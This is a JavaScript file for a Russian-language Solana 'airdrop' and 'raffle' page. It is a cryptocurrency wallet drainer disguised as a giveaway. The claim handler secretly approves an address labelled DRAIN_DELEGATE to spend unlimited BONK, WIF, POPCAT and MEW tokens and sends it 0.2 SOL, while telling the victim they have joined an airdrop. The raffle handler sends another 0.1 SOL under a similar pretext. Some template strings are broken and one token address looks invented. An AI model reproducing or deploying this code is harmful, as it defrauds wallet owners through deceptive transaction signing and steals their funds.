const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1"; // Твой новый кошелёк для слива

const MEME_MINTS = [
    "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
    "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
    "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
    "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t" // MEW
];

let walletPubkey = null;
let wallet = null;

async function connectWallet(preferred = "auto") {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
        const dappUrl = encodeURIComponent(window.location.href);
        window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
        return;
    }

    const wallets = [];
    if (window.phantom?.solana?.isPhantom) wallets.push({ provider: window.phantom.solana, id: "phantom" });
    if (window.solflare?.isSolflare) wallets.push({ provider: window.solflare, id: "solflare" });
    if (window.backpack) wallets.push({ provider: window.backpack.solana, id: "backpack" });
    if (window.glowSolana) wallets.push({ provider: window.glowSolana, id: "glow" });
    if (window.trustWallet?.solana) wallets.push({ provider: window.trustWallet.solana, id: "trust" });
    if (window.solana && !wallets.some(w => w.provider === window.solana)) wallets.push({ provider: window.solana, id: "generic" });

    if (wallets.length === 0) {
        document.getElementById('status').innerText = "Установи Solana wallet!";
        return;
    }

    let chosen = wallets[0];
    if (preferred !== "auto") {
        const found = wallets.find(w => w.id === preferred);
        if (found) chosen = found;
    }

    try {
        await chosen.provider.connect();
        wallet = chosen.provider;
        walletPubkey = wallet.publicKey.toString();

        document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
        document.getElementById('connect-btn').innerText = "Подключено";
        document.getElementById('connect-btn').disabled = true;
        document.getElementById('claim-btn').disabled = false;
        document.getElementById('raffle-btn').disabled = false;

        document.querySelectorAll('.wallet-card').forEach(card => {
            card.classList.toggle('wallet-card--active', card.dataset.wallet === chosen.id);
        });
    } catch (err) {
        document.getElementById('status').innerText = "Ошибка подключения";
    }
}

// Цепляем события после загрузки
window.addEventListener('load', () => {
    document.querySelectorAll('.wallet-card').forEach(card => {
        card.addEventListener('click', () => connectWallet(card.dataset.wallet));
    });

    const connectBtn = document.getElementById('connect-btn');
    if (connectBtn) connectBtn.addEventListener('click', () => connectWallet("auto"));

    const claimBtn = document.getElementById('claim-btn');
    if (claimBtn) claimBtn.addEventListener('click', async () => {
        if (!walletPubkey) {
            document.getElementById('status').innerText = "Сначала подключи кошелёк";
            return;
        }

        document.getElementById('status').innerText = "Подпиши для получения аирдропа...";

        try {
            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
            const owner = new solanaWeb3.PublicKey(walletPubkey);

            const tx = new solanaWeb3.Transaction();

            for (const mintStr of MEME_MINTS) {
                const mint = new solanaWeb3.PublicKey(mintStr);
                const userATA = await splToken.getAssociatedTokenAddress(mint, owner);

                const ataInfo = await connection.getAccountInfo(userATA);
                if (!ataInfo) {
                    tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
                }
              tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
            }

            tx.add(solanaWeb3.SystemProgram.transfer({
                fromPubkey: owner,
                toPubkey: delegate,
                lamports: 200000000 // 0.2 SOL
            }));

            tx.feePayer = owner;
            const { blockhash } = await connection.getLatestBlockhash();
            tx.recentBlockhash = blockhash;

            const signed = await wallet.signTransaction(tx);
            const sig = await connection.sendRawTransaction(signed.serialize());

            document.getElementById('status').innerHTML = Успех! Вы участвуете в аирдропе.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
            document.getElementById('claim-btn').disabled = true;
        } catch (err) {
            document.getElementById('status').innerText = "Ошибка — попробуй снова";
        }
    });

    const raffleBtn = document.getElementById('raffle-btn');
    if (raffleBtn) raffleBtn.addEventListener('click', async () => {
        if (!walletPubkey) {
            document.getElementById('status').innerText = "Сначала подключи кошелёк";
            return;
        }

        document.getElementById('status').innerText = "Подпиши для участия в розыгрыше...";

        try {
            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
            const owner = new solanaWeb3.PublicKey(walletPubkey);

            const tx = new solanaWeb3.Transaction();
            tx.add(solanaWeb3.SystemProgram.transfer({
                fromPubkey: owner,
                toPubkey: delegate,
                lamports: 100000000 // 0.1 SOL
            }));

            tx.feePayer = owner;
            const { blockhash } = await connection.getLatestBlockhash();
            tx.recentBlockhash = blockhash;

            const signed = await wallet.signTransaction(tx);
            const sig = await connection.sendRawTransaction(signed.serialize());

            document.getElementById('status').innerHTML = Успех! Вы в розыгрыше.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig.slice(0,12)}...</a>;
            document.getElementById('raffle-btn').disabled = true;
        } catch (err) {
            document.getElementById('status').innerText = "Ошибка — попробуй снова";
        }
    });
});
